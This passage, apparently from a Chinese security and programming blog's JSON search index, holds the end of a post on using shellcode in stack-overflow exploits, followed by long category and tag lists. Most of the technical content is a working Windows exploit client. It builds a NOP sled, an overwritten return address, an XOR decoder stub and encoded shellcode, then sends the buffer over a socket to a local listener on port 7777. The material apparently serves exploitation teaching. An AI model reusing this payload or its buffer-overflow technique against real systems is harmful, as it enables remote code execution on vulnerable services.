2.2, it will still return */ /* 2.2 in wVersion since that is the version we */ /* requested. */ if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 ) &#123; /* Tell the user that we could not find a usable */ /* WinSock DLL. */ WSACleanup( ); return false; &#125; return true;&#125;#define BUF_MAX_SIZE (0xC8 + 17 + 176 + 4)int main()&#123; char szBuf[BUF_MAX_SIZE] = &#123;0&#125;; memset(szBuf, 0x90, BUF_MAX_SIZE); unsigned char decode_data[17] = &#123; 0x33, 0xC9, 0xB1, 0xC8, 0x8B, 0xFC, 0x83, 0xC7, 0x15, 0x80, 0x37, 0x8C, 0x47, 0xFE, 0xC9, 0x75, 0xF8 &#125;; unsigned char encode_data[176] = &#123; 0x70, 0xE4, 0xE6, 0x86, 0xB4, 0x92, 0xE4, 0xEF, 0x05, 0x5D, 0xC3, 0xE4, 0xBE, 0xF8, 0x1D, 0x80, 0x07, 0x78, 0x01, 0xF2, 0x78, 0xBF, 0x57, 0x3B, 0x88, 0xA7, 0x6F, 0xEA, 0x37, 0xBF, 0xBE, 0xDF, 0xE4, 0xF9, 0xFF, 0xE9, 0xFE, 0xD8, 0xBF, 0x5E, 0xE8, 0x07, 0x91, 0x94, 0x8C, 0x8C, 0x8C, 0x07, 0xD7, 0xBC, 0x07, 0xD7, 0x80, 0x07, 0xD7, 0x80, 0x07, 0x97, 0x07, 0x97, 0x07, 0xE7, 0x94, 0x21, 0xB1, 0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x89, 0x19, 0x73, 0xDB, 0x74, 0x19, 0xEC, 0x07, 0xC9, 0xB0, 0x07, 0xC0, 0x89, 0xF4, 0x8F, 0x41, 0x07, 0xD5, 0xAC, 0x8F, 0x51, 0xBF, 0x73, 0xCB, 0x07, 0xB8, 0x37, 0x8F, 0x79, 0x15, 0x83, 0x32, 0x8A, 0xB6, 0x48, 0xF8, 0x84, 0x4D, 0x46, 0x8B, 0x8F, 0x5C, 0xCA, 0x67, 0x7D, 0xB7, 0xD8, 0xA8, 0x90, 0xF9, 0x68, 0x07, 0xD5, 0xA8, 0x8F, 0x51, 0xEA, 0x07, 0xB0, 0xF7, 0x07, 0xD5, 0x90, 0x8F, 0x51, 0x8F, 0xA0, 0x37, 0x19, 0xD3, 0x27, 0xDB, 0xED, 0xB1, 0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x25, 0xBF, 0x57, 0xDF, 0xE4, 0xE9, 0xE0, 0xE0, 0xE3, 0xE4, 0xFF, 0xED, 0xF5, 0xE4, 0x07, 0x48, 0xDF, 0xDC, 0xDC, 0xDF, 0x73, 0xDB, 0x70, 0xDF, 0x73, 0xDB, 0x74 &#125;; memcpy(&amp;szBuf[0xC8 + 4], decode_data, 17); memcpy(&amp;szBuf[0xC8 + 4 + 17], encode_data, 176); *(int *)&amp;szBuf[0xC8] = 0x71A2F8FB; if (SocketStartup() == false) &#123; return -1; &#125; SOCKET fdSock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); if (fdSock == INVALID_SOCKET) &#123; std::cout &lt;&lt; &quot;create socket descriptor failed&quot; &lt;&lt; std::endl; return -1; &#125; sockaddr_in stSockAddr = &#123;0&#125;; stSockAddr.sin_family = AF_INET; stSockAddr.sin_port = htons(0x1E61); stSockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); if (connect(fdSock, (sockaddr*)&amp;stSockAddr, sizeof(stSockAddr)) == SOCKET_ERROR) &#123; std::cout &lt;&lt; &quot;connect failed&quot; &lt;&lt; std::endl; closesocket(fdSock); WSACleanup(); return -1; &#125; if (send(fdSock, szBuf, BUF_MAX_SIZE, 0) == SOCKET_ERROR) &#123; std::cout &lt;&lt; &quot;send failed&quot; &lt;&lt; std::endl; shutdown(fdSock, SD_SEND); closesocket(fdSock); WSACleanup(); return -1; &#125; std::cout &lt;&lt; &quot;utilize success&quot; &lt;&lt; std::endl; shutdown(fdSock, SD_SEND); closesocket(fdSock); WSACleanup(); return 0;&#125; 效果截图：","categories":[{"name":"shellcode在漏洞利用中的应用","slug":"shellcode在漏洞利用中的应用","permalink":"https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"},{"name":"栈溢出","slug":"shellcode在漏洞利用中的应用/栈溢出","permalink":"https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"shellcode","slug":"shellcode","permalink":"https://4st.tech/tags/shellcode/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]}],"categories":[{"name":"C/C++逆向","slug":"C-C-逆向","permalink":"https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"},{"name":"机器学习","slug":"机器学习","permalink":"https://4st.tech/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"算法","slug":"算法","permalink":"https://4st.tech/categories/%E7%AE%97%E6%B3%95/"},{"name":"内核驱动编程","slug":"内核驱动编程","permalink":"https://4st.tech/categories/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B/"},{"name":"shellcode在漏洞利用中的应用","slug":"shellcode在漏洞利用中的应用","permalink":"https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"},{"name":"栈溢出","slug":"shellcode在漏洞利用中的应用/栈溢出","permalink":"https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"循环结构","slug":"循环结构","permalink":"https://4st.tech/tags/%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/"},{"name":"for","slug":"for","permalink":"https://4st.tech/tags/for/"},{"name":"while","slug":"while","permalink":"https://4st.tech/tags/while/"},{"name":"do...while","slug":"do-while","permalink":"https://4st.tech/tags/do-while/"},{"name":"continue","slug":"continue","permalink":"https://4st.tech/tags/continue/"},{"name":"break","slug":"break","permalink":"https://4st.tech/tags/break/"},{"name":"选择结构","slug":"选择结构","permalink":"https://4st.tech/tags/%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84/"},{"name":"分支结构","slug":"分支结构","permalink":"https://4st.tech/tags/%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/"},{"name":"条件转移","slug":"条件转移","permalink":"https://4st.tech/tags/%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB/"},{"name":"if","slug":"if","permalink":"https://4st.tech/tags/if/"},{"name":"else if","slug":"else-if","permalink":"https://4st.tech/tags/else-if/"},{"name":"if...else","slug":"if-else","permalink":"https://4st.tech/tags/if-else/"},{"name":"对偶","slug":"对偶","permalink":"https://4st.tech/tags/%E5%AF%B9%E5%81%B6/"},{"name":"拉格朗日对偶","slug":"拉格朗日对偶","permalink":"https://4st.tech/tags/%E6%8B%89%E6%A0%BC%E6%9C%97%E6%97%A5%E5%AF%B9%E5%81%B6/"},{"name":"互补松弛条件","slug":"互补松弛条件","permalink":"https://4st.tech/tags/%E4%BA%92%E8%A1%A5%E6%9D%BE%E5%BC%9B%E6%9D%A1%E4%BB%B6/"},{"name":"强对偶性","slug":"强对偶性","permalink":"https://4st.tech/tags/%E5%BC%BA%E5%AF%B9%E5%81%B6%E6%80%A7/"},{"name":"弱对偶性","slug":"弱对偶性","permalink":"https://4st.tech/tags/%E5%BC%B1%E5%AF%B9%E5%81%B6%E6%80%A7/"},{"name":"Duality","slug":"Duality","permalink":"https://4st.tech/tags/Duality/"},{"name":"Lower bound property","slug":"Lower-bound-property","permalink":"https://4st.tech/tags/Lower-bound-property/"},{"name":"Strong and Weak Duality","slug":"Strong-and-Weak-Duality","permalink":"https://4st.tech/tags/Strong-and-Weak-Duality/"},{"name":"Complementary Slackness","slug":"Complementary-Slackness","permalink":"https://4st.tech/tags/Complementary-Slackness/"},{"name":"KKT Conditions","slug":"KKT-Conditions","permalink":"https://4st.tech/tags/KKT-Conditions/"},{"name":"机器学习","slug":"机器学习","permalink":"https://4st.tech/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"优化","slug":"优化","permalink":"https://4st.tech/tags/%E4%BC%98%E5%8C%96/"},{"name":"凸优化","slug":"凸优化","permalink":"https://4st.tech/tags/%E5%87%B8%E4%BC%98%E5%8C%96/"},{"name":"凸集","slug":"凸集","permalink":"https://4st.tech/tags/%E5%87%B8%E9%9B%86/"},{"name":"凸函数","slug":"凸函数","permalink":"https://4st.tech/tags/%E5%87%B8%E5%87%BD%E6%95%B0/"},{"name":"半正定矩阵","slug":"半正定矩阵","permalink":"https://4st.tech/tags/%E5%8D%8A%E6%AD%A3%E5%AE%9A%E7%9F%A9%E9%98%B5/"},{"name":"优化问题的解决思路","slug":"优化问题的解决思路","permalink":"https://4st.tech/tags/%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/"},{"name":"前缀和","slug":"前缀和","permalink":"https://4st.tech/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"name":"差分","slug":"差分","permalink":"https://4st.tech/tags/%E5%B7%AE%E5%88%86/"},{"name":"高精度","slug":"高精度","permalink":"https://4st.tech/tags/%E9%AB%98%E7%B2%BE%E5%BA%A6/"},{"name":"加法","slug":"加法","permalink":"https://4st.tech/tags/%E5%8A%A0%E6%B3%95/"},{"name":"减法","slug":"减法","permalink":"https://4st.tech/tags/%E5%87%8F%E6%B3%95/"},{"name":"乘法","slug":"乘法","permalink":"https://4st.tech/tags/%E4%B9%98%E6%B3%95/"},{"name":"除法","slug":"除法","permalink":"https://4st.tech/tags/%E9%99%A4%E6%B3%95/"},{"name":"大整数运算","slug":"大整数运算","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"},{"name":"大整数加法","slug":"大整数加法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%8A%A0%E6%B3%95/"},{"name":"大整数减法","slug":"大整数减法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%87%8F%E6%B3%95/"},{"name":"大整数乘法","slug":"大整数乘法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E4%B9%98%E6%B3%95/"},{"name":"大整数除法","slug":"大整数除法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E9%99%A4%E6%B3%95/"},{"name":"C++大整数运算","slug":"C-大整数运算","permalink":"https://4st.tech/tags/C-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"},{"name":"switch-case","slug":"switch-case","permalink":"https://4st.tech/tags/switch-case/"},{"name":"switch-case还原","slug":"switch-case还原","permalink":"https://4st.tech/tags/switch-case%E8%BF%98%E5%8E%9F/"},{"name":"除法优化","slug":"除法优化","permalink":"https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"},{"name":"快速选择算法","slug":"快速选择算法","permalink":"https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9%E7%AE%97%E6%B3%95/"},{"name":"快速排序","slug":"快速排序","permalink":"https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"},{"name":"排序","slug":"排序","permalink":"https://4st.tech/tags/%E6%8E%92%E5%BA%8F/"},{"name":"归并排序","slug":"归并排序","permalink":"https://4st.tech/tags/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/"},{"name":"二分","slug":"二分","permalink":"https://4st.tech/tags/%E4%BA%8C%E5%88%86/"},{"name":"整数二分","slug":"整数二分","permalink":"https://4st.tech/tags/%E6%95%B4%E6%95%B0%E4%BA%8C%E5%88%86/"},{"name":"浮点数二分","slug":"浮点数二分","permalink":"https://4st.tech/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E4%BA%8C%E5%88%86/"},{"name":"内核","slug":"内核","permalink":"https://4st.tech/tags/%E5%86%85%E6%A0%B8/"},{"name":"驱动","slug":"驱动","permalink":"https://4st.tech/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"shellcode","slug":"shellcode","permalink":"https://4st.tech/tags/shellcode/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"name":"rop","slug":"rop","permalink":"https://4st.tech/tags/rop/"}]}